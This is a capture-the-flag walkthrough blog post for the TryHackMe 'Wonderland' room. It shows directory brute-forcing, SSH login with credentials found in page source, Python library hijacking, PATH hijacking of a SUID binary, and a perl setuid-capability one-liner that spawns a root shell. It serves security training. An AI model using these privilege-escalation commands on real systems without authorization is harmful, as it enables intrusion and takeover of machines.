---
layout: post
title: "Wonderland"
date: 2022-10-07
categories: [Tryhackme, Medium-THM]
tags: [gobuster, python-library-hijacking, SUID, getcap, perl]
image: ../../assets/img/posts/wonderland.png 

---

## Description

Fall down the rabbit hole and enter wonderland.

|**Room**|[Wonderland](https://tryhackme.com/room/wonderland)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Medium|
|**Creator**|[NinjaJc01](https://tryhackme.com/p/NinjaJc01)|

---

Starting off with deploying the machine, exporting IP and quickly scanning the open ports with rustscan,

```bash
export IP=10.10.121.198
rustscan -a $IP --range 0-65535 --ulimit 5000 -- -sVC -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/187021515-a8091c9e-8fb4-4b8f-97c9-ac430baa7afb.png)

Scan result shows that port 22 is running ssh service, port 80 is running Golang server. 

Let's start enumerating port 80 by visiting http://10.10.121.198 and we will be presented with a webpage having a picture of white rabbit,

![image](https://user-images.githubusercontent.com/67465230/187021580-44f30d21-b695-48f0-81d7-ec34b92788ca.png)

Following that, we need to brute force the hidden directories,

```bash
gobuster dir -u http://$IP -w /usr/share/SecLists/Discovery/Web-Content/common.txt -q -t 20 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187021637-01024748-b6f3-40f6-8c0b-92ee7498a2f0.png)

there is a hidden directory revealed, /r. 

Navigating to http://$IP/r and we will see the new message, *Would you tell me, please, which way I ought to go from here?*

![image](https://user-images.githubusercontent.com/67465230/187021645-03f31c19-796c-42ea-b1b9-b23ab7291c53.png)

From there, I decided to brute force this path again,

```bash
gobuster dir -u http://$IP/r -w /usr/share/SecLists/Discovery/Web-Content/common.txt -q -t 20 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187021662-a8bc7e6c-aaba-4896-a3d3-615c438658d8.png)

there is a hidden directory revealed, /a. 

Navigating to http://$IP/r/a and we will see the new message, *That depends a good deal on where you want to get to,*

![image](https://user-images.githubusercontent.com/67465230/187021713-3d2e220d-d9c9-4e46-9edc-5e01cd8d7478.png)

Again brute-forcing the directory, 

```bash
gobuster dir -u http://$IP/r/a -w /usr/share/SecLists/Discovery/Web-Content/common.txt -q -t 20 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187024035-ac0e44da-d4cf-4868-89bb-f314db32079e.png)

there is a hidden directory revealed, /b. 

Navigating to http://$IP/r/a/b and we will see the new message, 
*I don't much care where --*

![image](https://user-images.githubusercontent.com/67465230/187024077-83dc8882-5aee-4f39-b50e-6361b0afec3a.png)

Again brute-forcing the directory,

```bash
gobuster dir -u http://$IP/r/a/b -w /usr/share/SecLists/Discovery/Web-Content/common.txt -q -t 20 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187024092-1996c373-78db-432e-b254-785bc5fc438e.png)

there is a hidden directory revealed, /b. 

Navigating to http://$IP/r/a/b/b and we will see the new message, *Then it doesn't matter which way you go*

![image](https://user-images.githubusercontent.com/67465230/187021871-356de701-9bdc-4c4c-87ce-33e76db5442e.png)

Again brute-forcing the directory,

```bash
gobuster dir -u http://$IP/r/a/b/b -w /usr/share/SecLists/Discovery/Web-Content/common.txt -q -t 20 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187021880-8e1fd1be-0b58-48ab-9c0b-d7a875fb03dd.png)

there is a hidden directory revealed, /i.

Navigating to http://$IP/r/a/b/b/i and we will see the new message, *--so long as I get somewhere*

![image](https://user-images.githubusercontent.com/67465230/187021991-dfe15768-d206-4220-8fe7-e002ee210d4a.png)

Again brute-forcing the directory,

```bash
gobuster dir -u http://$IP/r/a/b/b/i -w /usr/share/SecLists/Discovery/Web-Content/common.txt -q -t 20 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187022008-289b6b0e-6837-41e4-960b-721d5d7cc64d.png)

there is a hidden directory revealed, /t.

Navigating to http://$IP/r/a/b/b/i/t and there we will see another page showing page showing us some message but after this, I can't brute force any further directories, 

![image](https://user-images.githubusercontent.com/67465230/187022020-2737f6b2-0d2e-46dc-90db-8dbe5d232fb9.png)

So, I checked the source code and saw that there are credentials lying hidden inside the paragraph,

![image](https://user-images.githubusercontent.com/67465230/187022028-078957dd-5820-4167-9d75-5a3bea59701d.png)

I tried these credentials via ssh to get into system as alice user and got access,

```bash
ssh alice@10.10.121.198
```

![image](https://user-images.githubusercontent.com/67465230/187022231-7fd09a8b-4572-4f0e-870e-58c993b4b103.png)

Enumerating home directory of alice directory and there we see the root.txt flag but it made me wonder why is the root.txt flag is placed in the home directory as it make no sense unless it has permission that only root user can read the content (and indeed, only root user can read it). Plus, there is a file named walrus_and_the_carpenter.py which looks interesting,

![image](https://user-images.githubusercontent.com/67465230/187022238-cedb94b2-63e3-4c74-a470-3aa682a3a696.png)

I was playing around and saw that user flag in root directory is readable by alice user,

```bash
cat /root/user.txt
```

![image](https://user-images.githubusercontent.com/67465230/187023667-60402c75-ef9b-4c0f-b17f-899e03f3e78f.png)

Now comes the privilege escalation where I was searching for binary which can be run as sudo,

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/187023683-5cf7c84b-7b55-4507-bf0b-8a01285a268c.png)

we can see that there is a file named **walrus_and_the_carpenter.py** which can be run as rabbit user. 

Here is the content of the python file, 

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head —
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat —
And this was odd, because, you know,
They hadn’t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more —
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes — and ships — and sealing-wax —
Of cabbages — and kings —
And why the sea is boiling hot —
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Seems like this is the poem and the library random is imported at the start of this code. Further, the for loop will print 10 lines of the poem randomly.

Since we only have read permissions of walrus_and_the_carpenter.py file, we can't modify this script directly. But, we can make our own library of the same name random. This is called [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/). 

![image](https://user-images.githubusercontent.com/67465230/187023703-0386e8b5-e5f7-41b9-be12-e78fee5ea9b5.png)

We will put our python reverse shell and save it. Now, when we run our walrus_and_the_carpenter.py file, the modules imported inside that Python file are being check inside the current working directory first. If those modules does not exist under the current working directory, Python looks for it’s own modules. 

Now, when we try to run walrus_and_the_carpenter.py file as rabbit user, it will get successfully executed and we will get rabbit user access,

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

![image](https://user-images.githubusercontent.com/67465230/187023718-9890f5dc-7456-4881-80e9-47d5b75d61c6.png)

Listing directory and we can see there is a SUID bit file present,

![image](https://user-images.githubusercontent.com/67465230/187023727-4424b14a-a021-42c5-a66e-d50da69ec385.png)

I tried to run this file it shows us the time and we are welcomed to the tea party (:

```bash
./teaParty
```

![image](https://user-images.githubusercontent.com/67465230/187023739-adffa40a-33ba-48d3-8051-59bc4d5e5371.png)

I also tried to check the file type and saw that this is a ELF type, meaning it is an executable file. When we execute the file, we see the error message **“Segmentation fault (core dumped)”** regardless of whatever the input we give. Then I decided to download this file over to my system, 

```bash
python3 -m http.server
wget http://10.10.121.198:8000/teaParty
```

Next, by examining the file we see that `date` command is executed without specifying an absolute path,

```bash
strings teaParty
```

![image](https://user-images.githubusercontent.com/67465230/187023774-998a9204-d276-4390-b728-fd5604f75d8c.png)

We can now create a shell script called date, place that in /tmp, and make it executable with `chmod +x /tmp/date`,

![image](https://user-images.githubusercontent.com/67465230/187023778-776c7c92-f3ff-4602-b583-9f6808349893.png)

Let's export our own PATH variable for hijacking,

```bash
export PATH=/tmp:$PATH
echo $PATH
```

Executing the file and we will see that we will become hatter user,

```bash
./teaParty
id
```

![image](https://user-images.githubusercontent.com/67465230/187023790-fafe9fc8-7f40-4df3-ad4d-33598d6d5ffd.png)

Listing the directory and there is a password.txt file,

![image](https://user-images.githubusercontent.com/67465230/187023802-8ddc3e28-78e5-4467-8d2b-736729328de0.png)

viewing the password.txt file and it is a password, and we can use it somewhere,

![image](https://user-images.githubusercontent.com/67465230/187023828-3a1c35b9-3de2-4fde-86ce-badcb788b8f0.png)

I tried to check sudo rights of hatter user, but it doesn't work. Then I tried to see if there are any [linux capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities) present on the system, and yes, there are!

```bash
getcap -r / 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/187023840-5bd86d93-f271-41db-9f87-7954b464fdf4.png)

Here, we see that there is a perl capability, and searching it up on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities), we can abuse this capability and escalate to root user using this one liner,

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![image](https://user-images.githubusercontent.com/67465230/187023852-ccd04b78-b9c1-424c-ad0c-981078a4cae5.png)

and we're root!